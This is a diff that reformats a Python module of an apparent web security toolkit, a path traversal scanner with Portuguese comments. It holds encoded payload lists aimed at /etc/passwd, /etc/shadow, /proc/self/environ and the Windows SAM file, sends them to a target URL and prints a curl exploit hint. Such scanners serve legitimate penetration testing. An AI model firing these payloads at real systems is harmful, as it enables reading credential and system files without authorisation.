@@ -56,113 +56,88 @@ from mytools.core.utils import (
 logger = logging.getLogger("mytools.pathtraversal")
 
 
-
 _CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
-
     "path": ["url_encoded", "double_encoded", "overlong_utf8", "overlong_3byte"],
-
     "param": ["param_traversal", "param_encoded", "param_json"],
-
     "semicolon": ["semicolon_bypass", "semicolon_encoded", "semicolon_double"],
-
     "mixed": ["mixed_encoding", "mixed_backslash", "tab_injection"],
-
     "platform": ["linux_passwd", "linux_proc", "windows_system"],
-
 }
 
 
-
 _TRAVERSAL_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
-
     ("url_encoded", "..%2f..%2f..%2fetc/passwd"),
-
     ("url_encoded", "..%2f..%2f..%2fproc/self/environ"),
-
     ("double_encoded", "..%252f..%252f..%252fetc/passwd"),
-
     ("double_encoded", "..%252f..%252fetc/passwd%2500"),
-
     ("overlong_utf8", "..%c0%af..%c0%afetc/passwd"),
-
     ("overlong_utf8", "..%c0%5c..%c0%5cwindows/win.ini"),
-
     ("overlong_3byte", "..%e0%80%af..%e0%80%afetc/passwd"),
-
 ]
-
 
 
 _SEMICOLON_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
-
     ("semicolon_bypass", "..;/..;/..;/etc/passwd"),
-
     ("semicolon_encoded", "..%3b..%3b..%3betc/passwd"),
-
     ("semicolon_double", "..%253b..%253b..%253betc/passwd"),
-
 ]
-
 
 
 _MIXED_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
-
     ("mixed_encoding", "..%c0%af..%252fetc/passwd"),
-
     ("mixed_backslash", "..%5c..%2fetc/passwd"),
-
     ("tab_injection", "..%09..%09..%09etc/passwd"),
-
 ]
-
 
 
 _PLATFORM_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
-
     ("linux_passwd", "..%2f..%2f..%2fetc/passwd"),
-
     ("linux_passwd", "..%2f..%2f..%2fetc/shadow"),
-
     ("linux_proc", "..%2f..%2f..%2fproc/self/environ"),
-
     ("linux_proc", "..%2f..%2f..%2fproc/self/cmdline"),
-
     ("windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"),
-
     ("windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"),
-
 ]
-
 
 
 def _load_category_map():
     from mytools.data import load_payloads
+
     data = load_payloads("web", "pathtraversal", default={"category_map": _CATEGORY_MAP_DEFAULT})
     return data.get("category_map", _CATEGORY_MAP_DEFAULT)
 
+
 def _load_traversal_payloads():
     from mytools.data import load_payloads
+
     data = load_payloads("web", "pathtraversal", default={"traversal_payloads": _TRAVERSAL_PAYLOADS_DEFAULT})
     raw = data.get("traversal_payloads", _TRAVERSAL_PAYLOADS_DEFAULT)
     return [tuple(item) for item in raw]
 
+
 def _load_semicolon_payloads():
     from mytools.data import load_payloads
+
     data = load_payloads("web", "pathtraversal", default={"semicolon_payloads": _SEMICOLON_PAYLOADS_DEFAULT})
     raw = data.get("semicolon_payloads", _SEMICOLON_PAYLOADS_DEFAULT)
     return [tuple(item) for item in raw]
 
+
 def _load_mixed_payloads():
     from mytools.data import load_payloads
+
     data = load_payloads("web", "pathtraversal", default={"mixed_payloads": _MIXED_PAYLOADS_DEFAULT})
     raw = data.get("mixed_payloads", _MIXED_PAYLOADS_DEFAULT)
     return [tuple(item) for item in raw]
 
+
 def _load_platform_payloads():
     from mytools.data import load_payloads
+
     data = load_payloads("web", "pathtraversal", default={"platform_payloads": _PLATFORM_PAYLOADS_DEFAULT})
     raw = data.get("platform_payloads", _PLATFORM_PAYLOADS_DEFAULT)
     return [tuple(item) for item in raw]
+
 
 _CATEGORY_MAP = _load_category_map()
 _TRAVERSAL_PAYLOADS = _load_traversal_payloads()
@@ -172,11 +147,8 @@ _PLATFORM_PAYLOADS = _load_platform_payloads()
 
 
 @dataclass(frozen=True, slots=True)
-
 class PathTraversalAttempt:
     """Tentativa individual de path traversal via encoding."""
-
-
 
     technique: str
 
@@ -209,16 +181,9 @@ class PathTraversalAttempt:
     tool: str = ""
 
 
-
-
-
 @dataclass(frozen=True, slots=True)
-
 class PathTraversalResult:
-
     """Resultado consolidado do scan de path traversal."""
-
-
 
     target: str
 
@@ -239,53 +204,33 @@ class PathTraversalResult:
     overall_status: str
 
 
-
-
-
 async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
-
     """Envia requisicao baseline para obter resposta de referencia."""
 
     try:
-
         resp = await client.get(url, follow_redirects=False)
 
         return resp.status_code, len(resp.content), resp.content
 
     except httpx.RequestError:
-
         return 0, 0, b""
 
 
-
-
-
-async def _test_path_traversal(
-
-    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
-
-) -> list[PathTraversalAttempt]:
-
+async def _test_path_traversal(client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]) -> list[PathTraversalAttempt]:
     """Testa path traversal via encoding em URLs."""
 
     attempts: list[PathTraversalAttempt] = []
 
     b_status, b_size, _ = baseline
 
-
-
     parsed = urlparse(url)
 
     base_path = parsed.path.rstrip("/")
 
-
-
     for technique, payload in _TRAVERSAL_PAYLOADS:
-
         test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))
 
         try:
-
             resp = await client.get(test_url, follow_redirects=False)
 
             t_status = resp.status_code
@@ -298,118 +243,67 @@ async def _test_path_traversal(
 
             vulnerable = status_changed and t_status == 200
 
-
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="path",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=t_status,
-
-                size_baseline=b_size,
-
-                size_test=t_size,
-
-                status_changed=status_changed,
-
-                size_changed=size_changed,
-
-                vulnerable=vulnerable,
-
-                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-
-                error="",
-
-                exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
-
-                tool="curl",
-
-            ))
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="path",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=t_status,
+                    size_baseline=b_size,
+                    size_test=t_size,
+                    status_changed=status_changed,
+                    size_changed=size_changed,
+                    vulnerable=vulnerable,
+                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    error="",
+                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
+                    tool="curl",
+                )
+            )
 
         except httpx.RequestError as exc:
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="path",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=0,
-
-                size_baseline=b_size,
-
-                size_test=0,
-
-                status_changed=False,
-
-                size_changed=False,
-
-                vulnerable=False,
-
-                details="",
-
-                error=str(exc),
-
-            ))
-
-
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="path",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(exc),
+                )
+            )
 
     return attempts
 
 
-
-
-
-async def _test_param_traversal(
-
-    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
-
-) -> list[PathTraversalAttempt]:
-
+async def _test_param_traversal(client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]) -> list[PathTraversalAttempt]:
     """Testa path traversal via parametros GET/POST."""
 
     attempts: list[PathTraversalAttempt] = []
 
     b_status, b_size, _ = baseline
 
-
-
     parsed = urlparse(url)
 
     base_url = urlunparse(parsed._replace(query=""))
 
-
-
     traversal_payloads = [
-
         ("param_traversal", {"file": "..%2f..%2f..%2fetc/passwd"}),
-
         ("param_encoded", {"path": "..%252f..%252fetc/passwd"}),
-
         ("param_json", {"path": "..%c0%af..%c0%afetc/passwd"}),
-
     ]
 
-
-
     for technique, data in traversal_payloads:
-
         try:
-
             resp = await client.get(base_url, params=data, follow_redirects=False)
 
             t_status = resp.status_code
@@ -420,108 +314,63 @@ async def _test_param_traversal(
 
             vulnerable = status_changed and t_status == 200
 
-
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="param",
-
-                url=base_url,
-
-                payload=str(data),
-
-                status_baseline=b_status,
-
-                status_test=t_status,
-
-                size_baseline=b_size,
-
-                size_test=t_size,
-
-                status_changed=status_changed,
-
-                size_changed=abs(t_size - b_size) > 50,
-
-                vulnerable=vulnerable,
-
-                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-
-                error="",
-
-                exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
-
-                tool="curl",
-
-            ))
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="param",
+                    url=base_url,
+                    payload=str(data),
+                    status_baseline=b_status,
+                    status_test=t_status,
+                    size_baseline=b_size,
+                    size_test=t_size,
+                    status_changed=status_changed,
+                    size_changed=abs(t_size - b_size) > 50,
+                    vulnerable=vulnerable,
+                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    error="",
+                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
+                    tool="curl",
+                )
+            )
 
         except httpx.RequestError as exc:
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="param",
-
-                url=base_url,
-
-                payload=str(data),
-
-                status_baseline=b_status,
-
-                status_test=0,
-
-                size_baseline=b_size,
-
-                size_test=0,
-
-                status_changed=False,
-
-                size_changed=False,
-
-                vulnerable=False,
-
-                details="",
-
-                error=str(exc),
-
-            ))
-
-
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="param",
+                    url=base_url,
+                    payload=str(data),
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(exc),
+                )
+            )
 
     return attempts
 
 
-
-
-
-async def _test_semicolon_traversal(
-
-    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
-
-) -> list[PathTraversalAttempt]:
-
+async def _test_semicolon_traversal(client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]) -> list[PathTraversalAttempt]:
     """Testa path traversal via semicolon bypass."""
 
     attempts: list[PathTraversalAttempt] = []
 
     b_status, b_size, _ = baseline
 
-
-
     parsed = urlparse(url)
 
     base_path = parsed.path.rstrip("/")
 
-
-
     for technique, payload in _SEMICOLON_PAYLOADS:
-
         test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))
 
         try:
-
             resp = await client.get(test_url, follow_redirects=False)
 
             t_status = resp.status_code
@@ -532,108 +381,63 @@ async def _test_semicolon_traversal(
 
             vulnerable = status_changed and t_status == 200
 
-
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="semicolon",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=t_status,
-
-                size_baseline=b_size,
-
-                size_test=t_size,
-
-                status_changed=status_changed,
-
-                size_changed=abs(t_size - b_size) > 50,
-
-                vulnerable=vulnerable,
-
-                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-
-                error="",
-
-                exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
-
-                tool="curl",
-
-            ))
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="semicolon",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=t_status,
+                    size_baseline=b_size,
+                    size_test=t_size,
+                    status_changed=status_changed,
+                    size_changed=abs(t_size - b_size) > 50,
+                    vulnerable=vulnerable,
+                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    error="",
+                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
+                    tool="curl",
+                )
+            )
 
         except httpx.RequestError as exc:
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="semicolon",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=0,
-
-                size_baseline=b_size,
-
-                size_test=0,
-
-                status_changed=False,
-
-                size_changed=False,
-
-                vulnerable=False,
-
-                details="",
-
-                error=str(exc),
-
-            ))
-
-
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="semicolon",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(exc),
+                )
+            )
 
     return attempts
 
 
-
-
-
-async def _test_mixed_traversal(
-
-    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
-
-) -> list[PathTraversalAttempt]:
-
+async def _test_mixed_traversal(client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]) -> list[PathTraversalAttempt]:
     """Testa path traversal via mixed encoding."""
 
     attempts: list[PathTraversalAttempt] = []
 
     b_status, b_size, _ = baseline
 
-
-
     parsed = urlparse(url)
 
     base_path = parsed.path.rstrip("/")
 
-
-
     for technique, payload in _MIXED_PAYLOADS:
-
         test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))
 
         try:
-
             resp = await client.get(test_url, follow_redirects=False)
 
             t_status = resp.status_code
@@ -644,108 +448,63 @@ async def _test_mixed_traversal(
 
             vulnerable = status_changed and t_status == 200
 
-
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="mixed",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=t_status,
-
-                size_baseline=b_size,
-
-                size_test=t_size,
-
-                status_changed=status_changed,
-
-                size_changed=abs(t_size - b_size) > 50,
-
-                vulnerable=vulnerable,
-
-                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-
-                error="",
-
-                exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
-
-                tool="curl",
-
-            ))
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="mixed",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=t_status,
+                    size_baseline=b_size,
+                    size_test=t_size,
+                    status_changed=status_changed,
+                    size_changed=abs(t_size - b_size) > 50,
+                    vulnerable=vulnerable,
+                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    error="",
+                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
+                    tool="curl",
+                )
+            )
 
         except httpx.RequestError as exc:
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="mixed",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=0,
-
-                size_baseline=b_size,
-
-                size_test=0,
-
-                status_changed=False,
-
-                size_changed=False,
-
-                vulnerable=False,
-
-                details="",
-
-                error=str(exc),
-
-            ))
-
-
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="mixed",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(exc),
+                )
+            )
 
     return attempts
 
 
-
-
-
-async def _test_platform_traversal(
-
-    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
-
-) -> list[PathTraversalAttempt]:
-
+async def _test_platform_traversal(client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]) -> list[PathTraversalAttempt]:
     """Testa path traversal via platform-specific paths."""
 
     attempts: list[PathTraversalAttempt] = []
 
     b_status, b_size, _ = baseline
 
-
-
     parsed = urlparse(url)
 
     base_path = parsed.path.rstrip("/")
 
-
-
     for technique, payload in _PLATFORM_PAYLOADS:
-
         test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))
 
         try:
-
             resp = await client.get(test_url, follow_redirects=False)
 
             t_status = resp.status_code
@@ -756,211 +515,124 @@ async def _test_platform_traversal(
 
             vulnerable = status_changed and t_status == 200
 
-
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="platform",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=t_status,
-
-                size_baseline=b_size,
-
-                size_test=t_size,
-
-                status_changed=status_changed,
-
-                size_changed=abs(t_size - b_size) > 50,
-
-                vulnerable=vulnerable,
-
-                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
-
-                error="",
-
-                exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
-
-                tool="curl",
-
-            ))
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="platform",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=t_status,
+                    size_baseline=b_size,
+                    size_test=t_size,
+                    status_changed=status_changed,
+                    size_changed=abs(t_size - b_size) > 50,
+                    vulnerable=vulnerable,
+                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    error="",
+                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
+                    tool="curl",
+                )
+            )
 
         except httpx.RequestError as exc:
-
-            attempts.append(PathTraversalAttempt(
-
-                technique=technique,
-
-                category="platform",
-
-                url=test_url,
-
-                payload=payload,
-
-                status_baseline=b_status,
-
-                status_test=0,
-
-                size_baseline=b_size,
-
-                size_test=0,
-
-                status_changed=False,
-
-                size_changed=False,
-
-                vulnerable=False,
-
-                details="",
-
-                error=str(exc),
-
-            ))
-
-
+            attempts.append(
+                PathTraversalAttempt(
+                    technique=technique,
+                    category="platform",
+                    url=test_url,
+                    payload=payload,
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(exc),
+                )
+            )
 
     return attempts
 
 
-
-
-
 async def scan_path_traversal(
-
     url: str,
-
     timeout: float = 10.0,
-
     user_agent: str | None = None,
-
     proxy: str | None = None,
-
     verify: bool = False,
-
     category: str | None = None,
-
     concurrency: int = 5,
-
 ) -> PathTraversalResult:
-
     """Executa scan de path traversal via encoding contra a URL alvo."""
 
     parsed = urlparse(url)
 
     if not parsed.scheme:
-
         url = f"http://{url}"
 
         parsed = urlparse(url)
 
-
-
     tls = parsed.scheme == "https"
 
-
-
     async with create_async_client(
-
         user_agent=user_agent or "MyTools/pathtraversal",
-
         proxy=proxy,
-
         timeout=timeout,
-
         verify=verify,
-
     ) as client:
-
         b_status, b_size, b_body = await _test_baseline(client, url)
 
         baseline = (b_status, b_size, b_body)
 
-
-
         sem = asyncio.Semaphore(concurrency)
-
-
 
         async def _limited(coro: Awaitable[object]) -> object:
 
             async with sem:
-
                 return await coro
-
-
 
         tasks: list[Awaitable[object]] = []
 
         selected = _CATEGORY_MAP.get(category, []) if category else []
 
-
-
         if not category or category == "path":
-
             tasks.append(_limited(_test_path_traversal(client, url, baseline)))
 
         if not category or category == "param":
-
             tasks.append(_limited(_test_param_traversal(client, url, baseline)))
 
         if not category or category == "semicolon":
-
             tasks.append(_limited(_test_semicolon_traversal(client, url, baseline)))
 
         if not category or category == "mixed":
-
             tasks.append(_limited(_test_mixed_traversal(client, url, baseline)))
 
         if not category or category == "platform":
-
             tasks.append(_limited(_test_platform_traversal(client, url, baseline)))
 
-
-
         if category and not selected:
-
             return PathTraversalResult(
-
                 target=url,
-
                 baseline_status=b_status,
-
                 baseline_size=b_size,
-
                 tls=tls,
-
                 attempts=[],
-
                 vulnerable_techniques=[],
-
                 blocked_techniques=[],
-
                 issues=[f"Categoria desconhecida: {category}"],
-
                 overall_status="error",
-
             )
-
-
 
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         all_attempts: list[PathTraversalAttempt] = []
 
         for r in results:
-
             if isinstance(r, list):
-
                 all_attempts.extend(r)
-
-
 
     vulnerable: list[str] = []
 
@@ -968,68 +640,40 @@ async def scan_path_traversal(
 
     issues: list[str] = []
 
-
-
     seen: set[str] = set()
 
     for att in all_attempts:
-
         if att.technique not in seen:
-
             seen.add(att.technique)
 
             if att.vulnerable:
-
                 vulnerable.append(att.technique)
 
             elif att.status_changed:
-
                 blocked.append(att.technique)
 
-
-
     if vulnerable:
-
         issues.append(f"{len(vulnerable)} tecnicas de path traversal vulneraveis")
 
     if blocked:
-
         issues.append(f"{len(blocked)} tecnicas bloqueadas pelo servidor")
-
-
 
     overall = "vulnerable" if vulnerable else "blocked" if blocked else "secure"
 
-
-
     return PathTraversalResult(
-
         target=url,
-
         baseline_status=b_status,
-
         baseline_size=b_size,
-
         tls=tls,
-
         attempts=all_attempts,
-
         vulnerable_techniques=vulnerable,
-
         blocked_techniques=blocked,
-
         issues=issues,
-
         overall_status=overall,
-
     )
 
 
-
-
-
 def print_results_fn(result: PathTraversalResult) -> None:
-
     """Exibe os resultados do scan formatados."""
 
     print()
@@ -1046,55 +690,34 @@ def print_results_fn(result: PathTraversalResult) -> None:
 
     print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))
 
-
-
     status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN
 
     print(color(f"\n  Status: {result.overall_status.upper()}", status_color))
 
-
-
     if result.vulnerable_techniques:
-
         print(color("\n  [VULNERAVEL]", Cyber.RED))
 
         for tech in result.vulnerable_techniques:
-
             print(color(f"    - {tech}", Cyber.RED))
 
             a = next((a for a in result.attempts if a.technique == tech), None)
 
             if a:
-
                 print_exploit_info(a.exploit, a.tool)
 
-
-
     if result.blocked_techniques:
-
         print(color("\n  [BLOQUEADO]", Cyber.GREEN))
 
         for tech in result.blocked_techniques:
-
             print(color(f"    - {tech}", Cyber.GREEN))
 
-
-
     if result.issues:
-
         print(color("\n  Observacoes:", Cyber.YELLOW))
 
         for issue in result.issues:
-
             print(color(f"    - {issue}", Cyber.YELLOW))
 
-
-
     print(color("=" * 60, Cyber.CYAN))
-
-
-
-
 
 
 class PathtraversalScanner(BaseScanner):
@@ -1124,15 +747,16 @@ class PathtraversalScanner(BaseScanner):
     def _add_arguments(self, parser: argparse.ArgumentParser) -> None:
         parser.add_argument("url", nargs="?", help="URL alvo para teste")
         parser.add_argument(
-        "-c", "--category",
-        choices=list(_CATEGORY_MAP.keys()),
-        help="Categoria de teste (path, param, semicolon, mixed, platform)",
+            "-c",
+            "--category",
+            choices=list(_CATEGORY_MAP.keys()),
+            help="Categoria de teste (path, param, semicolon, mixed, platform)",
         )
         parser.add_argument(
-        "--concurrency",
-        type=int,
-        default=5,
-        help="Numero de requisicoes simultaneas (default: 5)",
+            "--concurrency",
+            type=int,
+            default=5,
+            help="Numero de requisicoes simultaneas (default: 5)",
         )
 
     async def run_scan(self, **kwargs):  # type: ignore[override]
@@ -1145,7 +769,14 @@ class PathtraversalScanner(BaseScanner):
         return "https://target.com -c path"
 
     def _help(self) -> str:
-        return "Uso: <url> [opcoes]\n" "Exemplos:\n" " https://target.com\n" " https://target.com -c path\n" " https://target.com -c semicolon\n" " https://target.com -c platform --proxy http://127.0.0.1:8080"
+        return (
+            "Uso: <url> [opcoes]\n"
+            "Exemplos:\n"
+            " https://target.com\n"
+            " https://target.com -c path\n"
+            " https://target.com -c semicolon\n"
+            " https://target.com -c platform --proxy http://127.0.0.1:8080"
+        )
 
 
 scanner = PathtraversalScanner()
